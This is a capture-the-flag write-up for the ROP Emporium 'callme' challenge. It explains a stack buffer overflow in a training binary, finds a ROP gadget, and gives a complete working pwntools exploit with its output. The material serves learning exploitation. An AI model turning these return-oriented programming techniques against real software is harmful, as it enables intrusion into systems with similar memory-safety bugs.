# ROP - Callme


## Description 

This challenge has been taken from https://ropemporium.com/challenge/callme.html.
The purpose is to change the flow of execution such that the functions ```callme_one, callme_two,``` and ```callme_three``` are called in sequence with ```0xdeadbeefdeadbeef```, ```0xcafebabecafebabe```, and ```0xd00df00dd00df00d``` as parameters for each of them.
More information in the linked website.

## How to build the ROP chain

Download the challenge:
```sh
$ curl --output callme.zip https://ropemporium.com/binary/callme.zip
$ unzip callme.zip && rm callme.zip
```

First, let's see the function written by the programmer:
```sh
$ rabin2 -qs callme | grep -ve imp -e ' 0 '
```

```asm
0x00601070 8 stdout
0x00601078 1 completed.7698
0x00400898 90 pwnme
0x004008f2 74 usefulFunction
0x004009b0 2 __libc_csu_fini
0x00601070 8 stdout@@GLIBC_2.2.5
0x004009c0 4 _IO_stdin_used
0x00400940 101 __libc_csu_init
0x00400790 2 _dl_relocate_static_pie
0x00400760 43 _start
0x00400847 81 main
```

Enter to pwndbg (```gdb-pwndbg callme```) and disassemble ```pwnme``` and ```usefulFunction``` since we're interested in them:

```asm
pwndbg> disass pwnme
Dump of assembler code for function pwnme:
   0x0000000000400898 <+0:     push   rbp
   0x0000000000400899 <+1:     mov    rbp,rsp
   0x000000000040089c <+4:     sub    rsp,0x20
   0x00000000004008a0 <+8:     lea    rax,[rbp-0x20]
   0x00000000004008a4 <+12:    mov    edx,0x20
   0x00000000004008a9 <+17:    mov    esi,0x0
   0x00000000004008ae <+22:    mov    rdi,rax
   0x00000000004008b1 <+25:    call   0x400700 <memset@plt
   0x00000000004008b6 <+30:    mov    edi,0x4009f0
   0x00000000004008bb <+35:    call   0x4006d0 <puts@plt
   0x00000000004008c0 <+40:    mov    edi,0x400a13
   0x00000000004008c5 <+45:    mov    eax,0x0
   0x00000000004008ca <+50:    call   0x4006e0 <printf@plt
   0x00000000004008cf <+55:    lea    rax,[rbp-0x20]
   0x00000000004008d3 <+59:    mov    edx,0x200
   0x00000000004008d8 <+64:    mov    rsi,rax
   0x00000000004008db <+67:    mov    edi,0x0
   0x00000000004008e0 <+72:    call   0x400710 <read@plt
   0x00000000004008e5 <+77:    mov    edi,0x400a16
   0x00000000004008ea <+82:    call   0x4006d0 <puts@plt
   0x00000000004008ef <+87:    nop
   0x00000000004008f0 <+88:    leave  
   0x00000000004008f1 <+89:    ret    
End of assembler dump.
```

As we can see there's a ```rax,[rbp-0x20]``` instruction before the read operation. Here ```0x20``` is subtracted from ```rbp``` since they're the bytes allocated to store the input string (32 bytes): if more chars are inserted it's possible to overwrite the return address of this function, so this is the point where the flow of execution will be changed by us.

```asm
pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x00000000004008f2 <+0:     push   rbp
   0x00000000004008f3 <+1:     mov    rbp,rsp
   0x00000000004008f6 <+4:     mov    edx,0x6
   0x00000000004008fb <+9:     mov    esi,0x5
   0x0000000000400900 <+14:    mov    edi,0x4
   0x0000000000400905 <+19:    call   0x4006f0 <callme_three@plt
   0x000000000040090a <+24:    mov    edx,0x6
   0x000000000040090f <+29:    mov    esi,0x5
   0x0000000000400914 <+34:    mov    edi,0x4
   0x0000000000400919 <+39:    call   0x400740 <callme_two@plt
   0x000000000040091e <+44:    mov    edx,0x6
   0x0000000000400923 <+49:    mov    esi,0x5
   0x0000000000400928 <+54:    mov    edi,0x4
   0x000000000040092d <+59:    call   0x400720 <callme_one@plt
   0x0000000000400932 <+64:    mov    edi,0x1
   0x0000000000400937 <+69:    call   0x400750 <exit@plt
End of assembler dump.
```

This function is useful because:
- we can see that edx, esi, edi are the three registers used to store the parameters
- it contains the instruction addresses of the function calls (```callme_one, callme_two, callme_three```).

Since it's necessary to store values into edx, esi, edi, we need to find gadgets in the executables e.g. instructions which pop values in those registers and ends with a ret. ```ropper``` is a useful tool to find the available ones:

```sh
$ ropper -f callme
```

We can note that there's a gadget which it's the one we was looking for:


```0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; ```

Now we have all the elements to build a rop chain.
Here's how the stack should be structured before the ret instruction in the ```pwnme``` function:

```asm
|                    |
|                    |
|      p_gadget      |
| 0xdeadbeefdeadbeef |
| 0xcafebabecafebabe |
| 0xd00df00dd00df00d |
|     callme_one     |
|      p_gadget      |
| 0xdeadbeefdeadbeef |
| 0xcafebabecafebabe |
| 0xd00df00dd00df00d |
|     callme_two     |
|      p_gadget      |
| 0xdeadbeefdeadbeef |
| 0xcafebabecafebabe |
| 0xd00df00dd00df00d |
|    callme_three    |
|        ...         |
----------------------
          |
          V
|                    |
|                    |
| 0x000000000040093c |
| 0xdeadbeefdeadbeef |
| 0xcafebabecafebabe |
| 0xd00df00dd00df00d |
| 0x0000000000400720 |
| 0x000000000040093c |
| 0xdeadbeefdeadbeef |
| 0xcafebabecafebabe |
| 0xd00df00dd00df00d |
| 0x0000000000400740 |
| 0x000000000040093c |
| 0xdeadbeefdeadbeef |
| 0xcafebabecafebabe |
| 0xd00df00dd00df00d |
| 0x00000000004006f0 |
|        ...         |
----------------------
        STACK
```

## Exploit

```python
import pwn

p = pwn.process("./callme")

gdb_cmd = [
        'set disassembly-flavor intel',
        #'b *0x0000000000400735',
        #'b *0x0000000000400741',
        'c',
        ]

pwn.gdb.attach(p, gdbscript='\n'.join(gdb_cmd))

def build_callme_payload(p_callme):
    # rdi: first param
    # rsi: second "
    # rdx: third "

    rdi = 0xdeadbeefdeadbeef
    rsi = 0xcafebabecafebabe
    rdx = 0xd00df00dd00df00d
    return pwn.p64(rdi) + pwn.p64(rsi) + pwn.p64(rdx) + pwn.p64(p_callme)

# 0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; 
p_gadget = pwn.p64(0x000000000040093c)

# start building payload
payload = p_gadget * 6
# Callme One
payload += build_callme_payload(0x400720)
# Callme Two
payload += p_gadget
payload += build_callme_payload(0x400740)
# Callme three
payload += p_gadget
payload += build_callme_payload(0x4006f0)

p.recvuntil('\n>')
p.sendline(payload)

p.interactive()
```
```sh
$ python3 exploit.py

[+] Starting local process './callme': pid 15670
[*] running in new terminal: ['/usr/bin/gdb', '-q', './callme', '15670', '-x', '/tmp/pwnsm5xq4d2.gdb']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
 Thank you!
[*] Process './callme' stopped with exit code 0 (pid 15670)
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```
